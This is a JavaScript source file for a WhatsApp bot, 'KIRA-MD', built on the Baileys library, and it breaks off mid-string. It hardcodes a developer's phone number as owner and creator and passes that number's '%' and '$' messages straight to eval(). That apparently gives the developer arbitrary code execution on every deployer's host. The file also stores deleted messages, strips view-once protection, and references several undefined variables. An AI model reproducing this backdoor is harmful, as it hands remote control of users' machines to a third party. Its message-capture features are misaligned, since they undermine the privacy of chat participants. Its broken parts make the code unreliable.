require('dotenv').config();
process.on('unhandledRejection', error => console.error('Unhandled async error:', error?.message || error));
process.on('uncaughtException', error => console.error('Unhandled runtime error:', error?.message || error));
const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require('baileys')


  const l = console.log
  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
  const fs = require('fs')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const config = require('./config')
  const GroupEvents = require('./lib/groupevents');
  const qrcode = require('qrcode-terminal')
  const StickersTypes = require('wa-sticker-formatter')
  const util = require('util')
  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
  const FileType = require('file-type');
  const axios = require('axios')
  const { File } = require('megajs')
  const { fromBuffer } = require('file-type')
  const bodyparser = require('body-parser')
  const os = require('os')
  const Crypto = require('crypto')
  const path = require('path')
  const prefix = config.PREFIX

  const ownerNumber = ['2349052076139']

  const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir)
  }

  const clearTempDir = () => {
      fs.readdir(tempDir, (err, files) => {
          if (err) throw err;
          for (const file of files) {
              fs.unlink(path.join(tempDir, file), err => {
                  if (err) throw err;
              });
          }
      });
  }

  // Clear the temp directory every 5 minutes
  setInterval(clearTempDir, 5 * 60 * 1000);

  //===================SESSION-AUTH============================
// Persistent authentication lives in ./sessions. Telegram can start pairing.
const TELEGRAM_PAIR_CODE = 'KIRABOTS';
let activeConnection = null;
let pairingPhone = '';
let pairingNotifier = null;
let pluginsLoaded = false;
let reconnectTimer = null;
let serverStarted = false;
let telegramInitialized = false;
let startupConnectionRequested = false;

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

  //=============================================

  async function connectToWA() {
  console.log("Connecting to WhatsApp pls wait...");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
  var { version } = await fetchLatestBaileysVersion()

  const conn = makeWASocket({
          logger: P({ level: process.env.WA_LOG_LEVEL || 'info' }),
          printQRInTerminal: false,
          browser: Browsers.macOS("Firefox"),
          syncFullHistory: true,
          auth: state,
          version
          })
  activeConnection = conn;
  conn.ev.on('connection.update', (update) => {
  const { connection, lastDisconnect } = update
  if (connection === 'close') {
  const closeError = lastDisconnect?.error;
  const closeStatus = closeError?.output?.statusCode || closeError?.statusCode;
  const restartRequired = closeStatus === DisconnectReason.restartRequired || closeStatus === 515 || /restart required/i.test(closeError?.message || '');
  const deviceRemoved = closeStatus === 401 || closeError?.output?.payload?.error === 'Unauthorized';
  console.error('WhatsApp connection closed:', closeError?.message || closeError || 'unknown reason', deviceRemoved ? '(device removed; new pairing required)' : '');
  if (!restartRequired && pairingNotifier && pairingPhone) {
    pairingNotifier(null, closeError || new Error('Connection closed'));
    pairingPhone = ''; pairingNotifier = null;
  }
  activeConnection = null;
  if (closeStatus !== DisconnectReason.loggedOut && !deviceRemoved) {
    clearTimeout(reconnectTimer);
    reconnectTimer = setTimeout(() => connectToWA().catch(error => console.error('WhatsApp reconnect failed:', error.message)), restartRequired ? 500 : 3000)
  }
  } else if (connection === 'open') {
  clearTimeout(reconnectTimer);
  pairingPhone = ''; pairingNotifier = null;
  if (!pluginsLoaded) {
    console.log('Installing Kira commands');
    fs.readdirSync(path.join(__dirname, 'kira')).forEach((plugin) => {
      if (path.extname(plugin).toLowerCase() === '.js') require(path.join(__dirname, 'kira', plugin));
    });
    pluginsLoaded = true;
    console.log('Kira plugins installed successfully ✅');
  }
  console.log('Kira Bot Connected To Whatsapp ✅')

  let up = `╔══════ •⊰☆⊱• ══════╗
   🚶 *KIRA-MD NOTICE* 🚶
╚══════ •⊰☆⊱• ══════╝

🚶 *Hello KIRA-MD User!* 🚶

━━━━━━ •☆• ━━━━━━
» *Sleek, Powerful & Feature-Packed* 💎
» Your ultimate WhatsApp bot experience!

❤️ *Thanks for choosing KIRA-MD*

━━━━━━ •☆• ━━━━━━
🔗 *Official Channel:*

https://whatsapp.com/channel/0029VbD3gLiAzNbpaG3Z2E3x

⚙️ *Your Prefix:* » [ *${prefix}* ]

━━━━━━ •☆• ━━━━━━
📌 Please ⭐ our GitHub repo!

🌐 https://github.com/moodswing123/KIRA-.git

© *Victory Tech🚶* - *Innovating For You*`;
    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/tjejob.jpg` }, caption: up })
  }
  })
  conn.ev.on('creds.update', saveCreds)

  // Request the pairing code only after listeners are active; Baileys can close
  // the first stream with 515 (restart required) after the device is linked.
  if (pairingPhone && !state.creds.registered) {
    try {
      await new Promise(resolve => setTimeout(resolve, 1000));
      await conn.requestPairingCode(String(pairingPhone).replace(/\D/g, ''), TELEGRAM_PAIR_CODE);
      if (pairingNotifier) pairingNotifier(TELEGRAM_PAIR_CODE);
    } catch (error) {
      if (pairingNotifier) pairingNotifier(null, error);
      pairingPhone = ''; pairingNotifier = null;
      throw error;
    }
  }

  //==============================

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates);
      }
    }
  });
  //==============================

  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));

  //=============readstatus=======

  conn.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = (getContentType(mek.message) === 'ephemeralMessage')
    ? mek.message.ephemeralMessage.message
    : mek.message;
    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
  if (config.READ_MESSAGE === 'true') {
    await conn.readMessages([mek.key]);  // Mark message as read
    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
  }
    if(mek.message.viewOnceMessageV2)
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
      await conn.readMessages([mek.key])
    }
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
    const kiralike = await conn.decodeJid(conn.user.id);
    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    await conn.sendMessage(mek.key.remoteJid, {
      react: {
        text: randomEmoji,
        key: mek.key,
      }
    }, { statusJidList: [mek.key.participant, kiralike] });
  }
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
  const user = mek.key.participant
  const text = `${config.AUTO_STATUS_MSG}`
  await conn.sendMessage(user, { text: text, react: { text: '🎉', key: mek.key } }, { quoted: mek })
            }
            await Promise.all([
              saveMessage(mek),
            ]);
  const m = sms(conn, mek)
  const type = getContentType(mek.message)
  const content = JSON.stringify(mek.message)
  const from = mek.key.remoteJid
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  const isCmd = body.startsWith(prefix)
  var budy = typeof mek.text == 'string' ? mek.text : false;
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
  const args = body.trim().split(/ +/).slice(1)
  const q = args.join(' ')
  const text = args.join(' ')
  const isGroup = from.endsWith('@g.us')
  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
  const senderNumber = sender.split('@')[0]
  const botNumber = conn.user.id.split(':')[0]
  const pushname = mek.pushName || 'Sin Nombre'
  const isMe = botNumber.includes(senderNumber)
  const isOwner = ownerNumber.includes(senderNumber) || isMe
  const botNumber2 = await jidNormalizedUser(conn.user.id);
  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const participants = isGroup ? await groupMetadata.participants : ''
  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
  const isReact = m.message.reactionMessage ? true : false
  const reply = (teks) => {
  conn.sendMessage(from, { text: teks }, { quoted: mek })
  }
  const udp = botNumber.split('@')[0];
    const kira = ('2349052076139');
    let isCreator = [udp, kira, config.DEV]
					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
					.includes(mek.sender);

    if (isCreator && mek.text.startsWith('%')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = eval(code);
						if (typeof resultTest === 'object')
							reply(util.format(resultTest));
						else reply(util.format(resultTest));
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}
    if (isCreator && mek.text.startsWith('$')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = await eval(
							'const a = async()=>{\n' + code + '\n}\na()',
						);
						let h = util.format(resultTest);
						if (h === undefined) return console.log(h);
						else reply(h);
					} catch (err) {
						if (err === undefined)
							return console.log('error');
						else reply(util.format(err));
					}
					return;
				}
 //================ownerreact==============

if (senderNumber.includes("2347038253086") && !isReact) {
  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
  m.react(randomReaction);
}

  //==========public react============//

// Auto React for all messages (public and owner)
if (!isReact && config.AUTO_REACT === 'true') {
    const reactions = [
        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣',
        '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕',
        '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️',
        '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑',
        '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄',
        '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀',
        '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾',
        '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟',
        '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤',
        '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪',
        '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈',
        '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚',
        '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌',
        '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫',
        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
    ];

    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    m.react(randomReaction);
}

// custum react settings

// Custom React for all messages (public and owner)
if (!isReact && config.CUSTOM_REACT === 'true') {
    // Use custom emojis from the configuration (fallback to default if not set)
    const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    m.react(randomReaction);
}

  //==========WORKTYPE============
  if(!isOwner && config.MODE === "private") return
  if(!isOwner && isGroup && config.MODE === "inbox") return
  if(!isOwner && !isGroup && config.MODE === "groups") return

  // take commands

  const events = require('./command')
  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
  if (isCmd) {
  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
  if (cmd) {
  if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})

  try {
  cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
  } catch (e) {
  console.error("[PLUGIN ERROR] " + e);
  }
  }
  }
  events.commands.map(async(command) => {
  if (body && command.on === "body") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (mek.q && command.on === "text") {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (
  (command.on === "image" || command.on === "photo") &&
  mek.type === "imageMessage"
  ) {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  } else if (
  command.on === "sticker" &&
  mek.type === "stickerMessage"
  ) {
  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
  }});

  });
    //===================================================
    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user &&
            decode.server &&
            decode.user + '@' + decode.server) ||
          jid
        );
      } else return jid;
    };
    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      let vtype
      if (options.readViewOnce) {
          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
          delete message.message.viewOnceMessage.message[vtype].viewOnce
          message.message = {
              ...message.message.viewOnceMessage.message
          }
      }

      let mtype = Object.keys(message.message)[0]
      let content = await generateForwardMessageContent(message, forceForward)
      let ctype = Object.keys(content)[0]
      let context = {}
      if (mtype != "conversation") context = message.message[mtype].contextInfo
      content[ctype].contextInfo = {
          ...context,
          ...content[ctype].contextInfo
      }
      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
          ...content[ctype],
          ...options,
          ...(options.contextInfo ? {
              contextInfo: {
                  ...content[ctype].contextInfo,
                  ...options.contextInfo
              }
          } : {})
      } : {})
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
      return waMessage
    }
    //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
      let quoted = message.msg ? message.msg : message
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(quoted, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
      let type = await FileType.fromBuffer(buffer)
      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
          // save to file
      await fs.writeFileSync(trueFileName, buffer)
      return trueFileName
    }
    //=================================================
    conn.downloadMediaMessage = async(message) => {
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(message, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }

      return buffer
    }

    /**
    *
    * @param {*} jid
    * @param {*} message
    * @param {*} forceForward
    * @param {*} options
    * @returns
    */
    //================================================
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                  let mime = '';
                  let res = await axios.head(url)
                  mime = res.headers['content-type']
                  if (mime.split("/")[1] === "gif") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
                  }
                  let type = mime.split("/")[0] + "Message"
                  if (mime === "application/pdf") {
                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "image") {
                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "video") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "audio") {
                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
                  }
                }
    //==========================================================
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
      //let copy = message.toJSON()
      let mtype = Object.keys(copy.message)[0]
      let isEphemeral = mtype === 'ephemeralMessage'
      if (isEphemeral) {
          mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
      }
      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
      let content = msg[mtype]
      if (typeof content === 'string') msg[mtype] = text || content
      else if (content.caption) content.caption = text || content.caption
      else if (content.text) content.text = text || content.text
      if (typeof content !== 'string') msg[mtype] = {
          ...content,
          ...options
      }
      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
      copy.key.remoteJid = jid
      copy.key.fromMe = sender === conn.user.id

      return proto.WebMessageInfo.fromObject(copy)
    }


    /**
    *
    * @param {*} path
    * @returns
    */
    //=====================================================
    conn.getFile = async(PATH, save) => {
      let res
      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
          //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
      let type = await FileType.fromBuffer(data) || {
          mime: 'application/octet-stream',
          ext: '.bin'
      }
      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
      if (data && save) fs.promises.writeFile(filename, data)
      return {
          res,
          filename,
          size: await getSizeMedia(data),
          ...type,
          data
      }

    }
    //=====================================================
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true)
      let { filename, size, ext, mime, data } = types
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif.js')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    //=====================================================
    conn.parseMention = async(text) => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }
    //=====================================================
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let types = await conn.getFile(path, true)
      let { mime, ext, res, data, filename } = types
      if (res && res.status !== 200 || file.length <= 65536) {
          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
      }
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          caption,
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    /**
    *
    * @param {*} message
    * @param {*} filename
    * @param {*} attachExtension
    * @returns
    */
    //=====================================================
    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
      } else {
        buffer = await videoToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
    //=====================================================
    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options);
      } else {
        buffer = await imageToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
    //=====================================================
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })

            /**
             *
             * @param {*} jid
             * @param {*} path
             * @param {*} quoted
             * @param {*} options
             * @returns
             */
    //=====================================================
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }

    /**
    *
    * @param {*} jid
    * @param {*} path
    * @param {*} caption
    * @param {*} quoted
    * @param {*} options
    * @returns
    */
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })

    /**
     *
     * @param {*} jid
     * @param {*} path
     * @param {*} caption
     * @param {*} quoted
     * @param {*} options
     * @returns
     */
    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = {
              text,
              footer,
              buttons,
              headerType: 2,
              ...options
          }
          //========================================================================================================================================
      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
    //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
          templateMessage: {
              hydratedTemplate: {
                  imageMessage: message.imageMessage,
                  "hydratedContentText": text,
                  "hydratedFooterText": footer,
                  "hydratedButtons": but
              }
          }
      }), options)
      conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }

    /**
    *
    * @param {*} jid
    * @param {*} buttons
    * @param {*} caption
    * @param {*} footer
    * @param {*} quoted
    * @param {*} options
    */
    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
            id = conn.decodeJid(jid);

            withoutContact = conn.withoutContact || withoutContact;

            let v;

            if (id.endsWith('@g.us'))
                return new Promise(async resolve => {
                    v = store.contacts[id] || {};

                    if (!(v.name.notify || v.subject))
                        v = conn.groupMetadata(id) || {};

                    resolve(
                        v.name ||
                            v.subject ||
                            PhoneNumber(
                                '+' + id.replace('@s.whatsapp.net', ''),
                            ).getNumber('international'),
                    );
                });
            else
                v =
                    id === '0@s.whatsapp.net'
                        ? {
                                id,

                                name: 'WhatsApp',
                          }
                        : id === conn.decodeJid(conn.user.id)
                        ? conn.user
                        : store.contacts[id] || {};

            return (
                (withoutContact ? '' : v.name) ||
                v.subject ||
                v.verifiedName ||
                PhoneNumber(
                    '+' + jid.replace('@s.whatsapp.net', ''),
                ).getNumber('international')
            );
        };

        // Vcard Functionality
        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
            let list = [];
            for (let i of kon) {
                list.push({
                    displayName: await conn.getName(i + '@s.whatsapp.net'),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                        i + '@s.whatsapp.net',
                    )}\nFN:${
                        global.OwnerName
                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
                        global.email
                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                        global.github
                    }/KIRA\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                        global.location
                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                });
            }
            conn.sendMessage(
                jid,
                {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list,
                    },
                    ...opts,
                },
                { quoted },
            );
        };

        // Status aka brio
        conn.setStatus = status => {
            conn.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [
                    {
                        tag: 'status',
                        attrs: {},
                        content: Buffer.from(status, 'utf-8'),
                    },
                ],
            });
            return status;
        };
    conn.serializeM = mek => sms(conn, mek, store);
  }

  if (!serverStarted) {
    app.get("/", (req, res) => res.send("KIRA MD STARTED ✅"));
    app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
    serverStarted = true;
  }
  if (!startupConnectionRequested && (process.env.SESSION_ID || fs.existsSync(__dirname + '/sessions/creds.json'))) {
    startupConnectionRequested = true;
    setTimeout(() => connectToWA().catch(error => console.error('WhatsApp startup failed:', error.message)), 4000);
  }

  function canControlTelegram(msg) {
    const owner = String(process.env.TELEGRAM_OWNER_ID || '').trim();
    return Boolean(owner && String(msg?.from?.id) === owner);
  }
  const telegramImage = path.join(__dirname, 'V3.jpg');
  const developerUrl = process.env.DEVELOPER_URL || 'https://t.me/victory_is_h1m';
  const forceJoinButtons = [
    { text: process.env.FORCE_JOIN_1_TEXT || '📢 Join Channel 1', url: String(process.env.FORCE_JOIN_1_URL || '').trim() },
    { text: process.env.FORCE_JOIN_2_TEXT || '📢 Join Channel 2', url: String(process.env.FORCE_JOIN_2_URL || '').trim() }
  ].filter(button => /^https?:\/\//i.test(button.url));
  const mainKeyboard = {
    inline_keyboard: [
      [{ text: '⚙️ Owner Settings', callback_data: 'kira_owner' }, { text: '🛡 Kira Access', callback_data: 'kira_access' }],
      [{ text: '🔗 Pair WhatsApp', callback_data: 'kira_pair' }, { text: '📡 Status', callback_data: 'kira_status' }],
      [{ text: '❤️ Thanks To', callback_data: 'kira_thanks' }],
      ...(forceJoinButtons.length ? [forceJoinButtons] : []),
      [{ text: '💻 Victory Tech', url: developerUrl }]
    ]
  };
  const mainText = (firstName = 'there') =>
    `<b>╔════════════════════╗</b>\n` +
    `<b>║      KIRA MD      ║</b>\n` +
